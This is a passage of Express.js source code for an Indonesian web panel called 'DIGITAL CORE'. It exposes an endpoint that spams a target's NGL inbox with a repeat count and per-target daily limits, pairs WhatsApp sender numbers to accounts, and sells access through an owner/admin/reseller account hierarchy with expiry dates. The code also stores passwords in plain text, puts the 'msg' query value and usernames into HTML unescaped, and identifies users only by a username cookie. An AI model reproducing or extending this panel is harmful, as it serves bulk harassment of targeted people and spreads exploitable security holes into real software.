      message: `Target ${target} sudah terima ${currentTargetUsage} pesan hari ini. Limit: ${limits.maxDailyPerTarget}/hari`,
      currentTargetUsage: currentTargetUsage,
      targetDailyLimit: limits.maxDailyPerTarget,
      remaining: limits.maxDailyPerTarget - currentTargetUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  try {
    // Kirim pesan
    const result = await nglSpam(target, message, parseInt(count));
    
    // ✅ UPDATE TRACKING setelah berhasil
    userTracking.updateUser(userId, result.success);
    userTracking.updateTarget(target, result.success);
    
    // Kirim response dengan statistik
    res.json({
      ...result,
      stats: {
        userToday: userTracking.getUserStats(userId),
        userLimit: limits.maxDailyPerUser,
        targetToday: userTracking.getTargetStats(target),
        targetLimit: limits.maxDailyPerTarget,
        remaining: {
          user: limits.maxDailyPerUser - userTracking.getUserStats(userId),
          target: limits.maxDailyPerTarget - userTracking.getTargetStats(target)
        }
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Route untuk TikTok (HANYA bisa diakses setelah login)
app.get("/tiktok", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// Route untuk halaman My Senders
app.get("/my-senders", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file sender.html:", err);
      return res.status(500).send("File sender.html tidak ditemukan");
    }
    res.send(html);
  });
});

// API untuk mendapatkan daftar sender user
app.get("/api/my-senders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

// SSE endpoint untuk events real-time
app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  // Simpan response object untuk user ini
  userEvents.set(username, res);

  // Kirim heartbeat setiap 30 detik
  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  // Cleanup saat connection close
  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  // Kirim event connection established
  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

// API untuk menambah sender baru
app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  // Validasi nomor
  const cleanNumber = number.replace(/\D/g, '');
  if (!cleanNumber.startsWith('62')) {
    return res.json({ success: false, error: "Nomor harus diawali dengan 62" });
  }
  
  if (cleanNumber.length < 10) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }
  
  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);
    
    // Langsung jalankan koneksi di background
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((sock) => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
        // Simpan socket ke map jika diperlukan
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({ 
      success: true, 
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });
    
  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({ 
      success: false, 
      error: "Terjadi error saat memproses sender: " + error.message 
    });
  }
});

// API untuk menghapus sender
app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }
    
    // Hapus folder session
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ============= User Add ================== \\
// GANTI kode route /adduser yang ada dengan yang ini:
app.post("/adduser", requireAuth, (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const users = getUsers();
    const currentUser = users.find(u => u.username === username);
    
    if (!currentUser) {
      return res.redirect("/login?msg=User tidak ditemukan");
    }

    const sessionRole = currentUser.role || 'user';
    const { username: newUsername, password, role, durasi } = req.body;

    // Validasi input lengkap
    if (!newUsername || !password || !role || !durasi) {
      return res.send(`
        <script>
          alert("❌ Lengkapi semua kolom.");
          window.history.back();
        </script>
      `);
    }

    // Validasi durasi
    const durasiNumber = parseInt(durasi);
    if (isNaN(durasiNumber) || durasiNumber <= 0) {
      return res.send(`
        <script>
          alert("❌ Durasi harus angka positif.");
          window.history.back();
        </script>
      `);
    }

    // Cek hak akses berdasarkan role pembuat
    if (sessionRole === "user") {
      return res.send(`
        <script>
          alert("🚫 User tidak bisa membuat akun.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role !== "user") {
      return res.send(`
        <script>
          alert("🚫 Reseller hanya boleh membuat user biasa.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "admin") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat admin lain.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Reseller tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    // Cek username sudah ada
    if (users.some(u => u.username === newUsername)) {
      return res.send(`
        <script>
          alert("❌ Username '${newUsername}' sudah terdaftar.");
          window.history.back();
        </script>
      `);
    }

    // Validasi panjang username dan password
    if (newUsername.length < 3) {
      return res.send(`
        <script>
          alert("❌ Username minimal 3 karakter.");
          window.history.back();
        </script>
      `);
    }

    if (password.length < 4) {
      return res.send(`
        <script>
          alert("❌ Password minimal 4 karakter.");
          window.history.back();
        </script>
      `);
    }

    const expired = Date.now() + (durasiNumber * 86400000);

    // Buat user baru
    const newUser = {
      username: newUsername,
      key: password,
      expired,
      role,
      telegram_id: "",
      isLoggedIn: false
    };

    users.push(newUser);
    
    // Simpan dan cek hasilnya
    const saveResult = saveUsers(users);
    
    if (!saveResult) {
      throw new Error("Gagal menyimpan data user ke file system");
    }

    // Redirect ke userlist dengan pesan sukses
    return res.redirect("/userlist?msg=User " + newUsername + " berhasil dibuat");

  } catch (error) {
    console.error("❌ Error in /adduser:", error);
    return res.send(`
      <script>
        alert("❌ Terjadi error saat menambahkan user: ${error.message}");
        window.history.back();
      </script>
    `);
  }
});

// TAMBAHKAN route ini SEBELUM route POST /adduser
app.get("/adduser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa menambah user.");
  }

  // Tentukan opsi role berdasarkan role current user
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
      <option value="admin">Admin</option>
      <option value="owner">Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
    `;
  } else {
    // Reseller hanya bisa buat user biasa
    roleOptions = `<option value="user">User</option>`;
  }

  const html = `
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Tambah User - DIGITAL CORE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      body {
        font-family: 'Poppins', sans-serif;
        background: #000000;
        color: #F0F0F0;
        min-height: 100vh;
        padding: 20px;
        position: relative;
        overflow-y: auto; 
        overflow-x: hidden;
      }

      #particles {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 0;
      }

      .content {
        position: relative;
        z-index: 2;
        max-width: 500px;
        margin: 0 auto;
      }

      .header {
        text-align: center;
        margin-bottom: 30px;
        padding: 20px;
      }

      .header h2 {
        color: #F0F0F0;
        font-size: 24px;
        font-family: 'Orbitron', sans-serif;
        text-transform: uppercase;
        letter-spacing: 2px;
        margin-bottom: 10px;
        text-shadow: 0 0 10px rgba(240, 240, 240, 0.5);
      }

      .header p {
        color: #A0A0A0;
        font-size: 14px;
      }

      .form-container {
        background: rgba(26, 26, 26, 0.9);
        border: 1px solid #333333;
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        margin-bottom: 20px;
      }

      .user-info {
        background: rgba(51, 51, 51, 0.6);
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 20px;
        border-left: 4px solid #4ECDC4;
      }

      .info-row {
        display: flex;
        justify-content: space-between;
        margin-bottom: 8px;
        font-size: 13px;
      }

      .info-label {
        color: #A0A0A0;
        font-weight: 600;
      }

      .info-value {
        color: #F0F0F0;
        font-weight: 500;
      }

      .role-badge {
        display: inline-block;
        padding: 4px 12px;
        border-radius: 20px;
        font-size: 11px;
        font-weight: bold;
        text-transform: uppercase;
      }

      .role-owner {
        background: linear-gradient(135deg, #FFD700, #FFA500);
        color: #000;
      }

      .role-admin {
        background: linear-gradient(135deg, #FF6B6B, #FF8E8E);
        color: #fff;
      }

      .role-reseller {
        background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
        color: #000;
      }

      .role-user {
        background: linear-gradient(135deg, #95E1D3, #B5EAD7);
        color: #000;
      }

      .form-group {
        margin-bottom: 20px;
      }

      label {
        display: block;
        margin-bottom: 8px;
        font-weight: 600;
        color: #F0F0F0;
        font-family: 'Poppins', sans-serif;
        font-size: 13px;
        text-transform: uppercase;
        letter-spacing: 1px;
      }

      input, select {
        width: 100%;
        padding: 14px;
        border-radius: 8px;
        border: 1px solid #333333;
        background: rgba(38, 38, 38, 0.8);
        color: #F0F0F0;
        box-sizing: border-box;
        font-size: 14px;
        transition: all 0.3s ease;
      }

      input:focus, select:focus {
        outline: none;
        border-color: #F0F0F0;
        box-shadow: 0 0 10px rgba(240, 240, 240, 0.3);
      }

      .permission-info {
        background: rgba(51, 51, 51, 0.6);
        padding: 12px;
        border-radius: 6px;
        font-size: 11px;
        color: #A0A0A0;
        text-align: center;
        margin-top: 15px;
        border: 1px dashed #333333;
      }

      .warning-text {
        color: #FF6B6B;
        font-weight: bold;
      }

      .button-group {
        display: flex;
        gap: 15px;
        margin-top: 25px;
      }

      .btn {
        flex: 1;
        padding: 14px;
        border: none;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.3s ease;
        font-family: 'Orbitron', sans-serif;
        font-size: 13px;
        text-transform: uppercase;
        letter-spacing: 1px;
        text-align: center;
        text-decoration: none;
      }

      .btn-save {
        background: rgba(240, 240, 240, 0.9);
        color: #000;
      }

      .btn-save:hover {
        background: #F0F0F0;
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(240, 240, 240, 0.3);
      }

      .btn-back {
        background: rgba(51, 51, 51, 0.8);
        color: #F0F0F0;
        border: 1px solid #333333;
      }

      .btn-back:hover {
        background: rgba(240, 240, 240, 0.1);
        border-color: #F0F0F0;
        transform: translateY(-2px);
      }

      .permission-note {
        background: rgba(51, 51, 51, 0.6);
        padding: 12px;
        border-radius: 6px;
        font-size: 11px;
        color: #A0A0A0;
        text-align: center;
        margin-top: 15px;
        border-left: 3px solid #4ECDC4;
      }

      @media (max-width: 500px) {
        body {
          padding: 16px;
        }

        .content {
          max-width: 100%;
        }

        .form-container {
          padding: 20px;
        }

        .button-group {
          flex-direction: column;
        }

        .header h2 {
          font-size: 20px;
        }
      }

      /* Animasi */
      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(20px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .form-container {
        animation: fadeIn 0.6s ease-out;
      }
    </style>
  </head>
  <body>
    <!-- Efek Partikel -->
    <div id="particles"></div>

    <div class="content">
      <div class="header">
        <h2><i class="fas fa-user-plus"></i> TAMBAH USER BARU</h2>
        <p>Buat akun user baru dengan role yang sesuai</p>
      </div>

      <div class="form-container">
        <!-- Current User Information -->
        <div class="user-info">
          <div class="info-row">
            <span class="info-label">Anda Login Sebagai:</span>
            <span class="info-value">${username}</span>
          </div>
          <div class="info-row">
            <span class="info-label">Role Anda:</span>
            <span class="info-value">
              <span class="role-badge role-${role}">
                ${role.charAt(0).toUpperCase() + role.slice(1)}
              </span>
            </span>
          </div>
        </div>

        <form method="POST" action="/adduser">
          <div class="form-group">
            <label for="username"><i class="fas fa-user"></i> Username</label>
            <input type="text" id="username" name="username" placeholder="Masukkan username" required>
          </div>

          <div class="form-group">
            <label for="password"><i class="fas fa-key"></i> Password / Key</label>
            <input type="text" id="password" name="password" placeholder="Masukkan password" required>
          </div>

          <div class="form-group">
            <label for="role"><i class="fas fa-shield-alt"></i> Role</label>
            <select id="role" name="role" required>
              ${roleOptions}
            </select>
          </div>

          <div class="form-group">
            <label for="durasi"><i class="fas fa-calendar-plus"></i> Durasi (Hari)</label>
            <input type="number" id="durasi" name="durasi" min="1" max="365" placeholder="30" value="30" required>
          </div>

          <div class="permission-info">
            <i class="fas fa-info-circle"></i> 
            <strong>Info Hak Akses:</strong> 
            ${role === 'reseller' ? 'Reseller hanya bisa membuat User biasa' : 
              role === 'admin' ? 'Admin bisa membuat User dan Reseller' : 
              'Owner bisa membuat semua role'}
          </div>

          <div class="button-group">
            <button type="submit" class="btn btn-save">
              <i class="fas fa-save"></i> BUAT USER
            </button>
            
            <a href="/userlist" class="btn btn-back">
              <i class="fas fa-arrow-left"></i> BATAL
            </a>
          </div>
        </form>
            
        <div class="permission-note">
          <i class="fas fa-exclamation-triangle"></i>
          Pastikan data yang dimasukkan sudah benar. User yang dibuat tidak bisa dihapus oleh pembuatnya.
        </div>
      </div>
    </div>

    <!-- JS Partikel -->
    <script>
      $(document).ready(function() {
        $('#particles').particleground({
          dotColor: '#333333',
          lineColor: '#555555',
          minSpeedX: 0.1,
          maxSpeedX: 0.3,
          minSpeedY: 0.1,
          maxSpeedY: 0.3,
          density: 8000,
          particleRadius: 2,
          curvedLines: false,
          proximity: 100
        });

        // Update role badge preview
        document.getElementById('role').addEventListener('change', function() {
          const selectedRole = this.value;
          const badge = document.querySelector('.role-badge');
          if (badge) {
            badge.className = \`role-badge role-\${selectedRole}\`;
            badge.textContent = selectedRole.charAt(0).toUpperCase() + selectedRole.slice(1);
          }
        });
      });
    </script>
  </body>
  </html>
  `;
  res.send(html);
});

app.post("/hapususer", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { username: targetUsername } = req.body;

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒

  // 1. Tidak bisa hapus diri sendiri
  if (sessionUsername === targetUsername) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  // 2. Reseller hanya boleh hapus user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh hapus user biasa.");
  }

  // 3. Admin tidak boleh hapus admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa hapus admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa hapus owner.");
    }
  }

  // 4. Owner bisa hapus semua kecuali diri sendiri

  // Lanjut hapus
  const filtered = users.filter(u => u.username !== targetUsername);
  saveUsers(filtered);
  
  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + targetUsername + " berhasil dihapus");
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });
    
    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));
    
    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;
    
    if (user.username === username) {
      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }
    
    const editButton = canEdit 
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;
    
    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  // Tombol Tambah User Baru
  const addUserButton = `
    <div style="text-align: center; margin: 20px 0;">
      <a href="/adduser" class="btn-add-user">
        <i class="fas fa-user-plus"></i> TAMBAH USER BARU
      </a>
    </div>
  `;

  const html = `
   <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User List - DIGITAL CORE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { 
      box-sizing: border-box; 
      margin: 0; 
      padding: 0; 
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: #000000;
      color: #F0F0F0;
      min-height: 100vh;
      padding: 16px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
    }

    #particles {
      position: fixed;
      top: 0; 
      left: 0;
      width: 100%; 
      height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1200px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
    }

    .header h2 {
      color: #F0F0F0;
      font-size: 28px;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 10px;
      text-shadow: 0 0 10px rgba(240, 240, 240, 0.5);
    }

    .header p {
      color: #A0A0A0;
      font-size: 14px;
    }

    /* Tombol Tambah User */
    .btn-add-user {
      display: inline-block;
      padding: 14px 30px;
      background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
      color: #000;
      text-decoration: none;
      border-radius: 8px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      letter-spacing: 1px;
      transition: all 0.3s ease;
      border: none;
      cursor: pointer;
      font-size: 14px;
      box-shadow: 0 4px 15px rgba(78, 205, 196, 0.3);
    }

    .btn-add-user:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(78, 205, 196, 0.5);
      background: linear-gradient(135deg, #6BFFE6, #4ECDC4);
    }

    .table-container {
      overflow-x: auto;
      border-radius: 12px;
      border: 1px solid #333333;
      background: rgba(26, 26, 26, 0.8);
      backdrop-filter: blur(10px);
      font-size: 14px;
      margin-bottom: 20px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 600px;
    }
    
    th, td {
      padding: 15px 12px;
      text-align: left;
      border-bottom: 1px solid #333333;
      white-space: nowrap;
    }

    th {
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-size: 12px;
      font-family: 'Orbitron', sans-serif;
    }

    td {
      background: rgba(38, 38, 38, 0.7);
      color: #E0E0E0;
      font-size: 13px;
    }

    tr:hover td {
      background: rgba(60, 60, 60, 0.8);
      transition: background 0.3s ease;
    }

    .role-badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: bold;
      text-transform: uppercase;
    }

    .role-owner {
      background: linear-gradient(135deg, #FFD700, #FFA500);
      color: #000;
    }

    .role-admin {
      background: linear-gradient(135deg, #FF6B6B, #FF8E8E);
      color: #fff;
    }

    .role-reseller {
      background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
      color: #000;
    }

    .role-user {
      background: linear-gradient(135deg, #95E1D3, #B5EAD7);
      color: #000;
    }

    .btn-edit {
      display: inline-block;
      padding: 6px 12px;
      background: rgba(78, 205, 196, 0.2);
      border: 1px solid rgba(78, 205, 196, 0.5);
      border-radius: 6px;
      color: #4ECDC4;
      text-decoration: none;
      font-size: 12px;
      transition: all 0.3s ease;
    }

    .btn-edit:hover {
      background: rgba(78, 205, 196, 0.3);
      transform: translateY(-2px);
    }

    .close-btn {
      display: block;
      width: 200px;
      padding: 14px;
      margin: 30px auto;
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      text-align: center;
      border-radius: 8px;
      text-decoration: none;
      font-size: 14px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      border: 1px solid #333333;
      cursor: pointer;
      transition: all 0.3s ease;
      box-sizing: border-box;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .close-btn:hover {
      background: rgba(240, 240, 240, 0.1);
      border-color: #F0F0F0;
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(240, 240, 240, 0.2);
    }

    .stats-bar {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
      padding: 15px;
      background: rgba(26, 26, 26, 0.8);
      border: 1px solid #333333;
      border-radius: 8px;
      font-size: 13px;
    }

    .stat-item {
      text-align: center;
      flex: 1;
    }

    .stat-value {
      font-size: 18px;
      font-weight: bold;
      color: #F0F0F0;
      font-family: 'Orbitron', sans-serif;
    }

    .stat-label {
      font-size: 11px;
      color: #A0A0A0;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    @media (max-width: 768px) {
      .header h2 { 
        font-size: 22px; 
      }
      
      table { 
        font-size: 12px; 
      }
      
      th, td { 
        padding: 10px 8px; 
      }
      
      .stats-bar {
        flex-direction: column;
        gap: 10px;
      }
      
      .stat-item {
        text-align: left;
      }
      
      .btn-add-user {
        padding: 12px 20px;
        font-size: 12px;
      }
    }

    @media (max-width: 600px) {
      body {
        padding: 10px;
      }
      
      .header {
        padding: 10px;
      }
      
      .header h2 { 
        font-size: 18px; 
      }
    }

    /* Animasi untuk tabel */
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .table-container {
      animation: fadeIn 0.6s ease-out;
    }

    /* Scrollbar styling */
    .table-container::-webkit-scrollbar {
      height: 8px;
    }

    .table-container::-webkit-scrollbar-track {
      background: rgba(51, 51, 51, 0.5);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb {
      background: rgba(240, 240, 240, 0.3);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb:hover {
      background: rgba(240, 240, 240, 0.5);
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-users"></i> USER LIST</h2>
      <p>Daftar semua user yang terdaftar dalam sistem</p>
    </div>

    <!-- Notifikasi Pesan -->
    ${messageHtml}

    <!-- Tombol Tambah User Baru -->
    ${addUserButton}

    <!-- Stats Bar -->
    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Regular Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Resellers</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Admins</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-user"></i> Username</th>
            <th><i class="fas fa-shield-alt"></i> Role</th>
            <th><i class="fas fa-calendar-times"></i> Expired</th>
            <th><i class="fas fa-clock"></i> Remaining</th>
            <th><i class="fas fa-cog"></i> Actions</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-times"></i> TUTUP PROFIL
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#333333',
        lineColor: '#555555',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 8000,
        particleRadius: 2,
        curvedLines: false,
        proximity: 100
      });
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });
    
    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));
    
    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;
    
    if (user.username === username) {
      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }
    
    const editButton = canEdit 
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;
    
    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
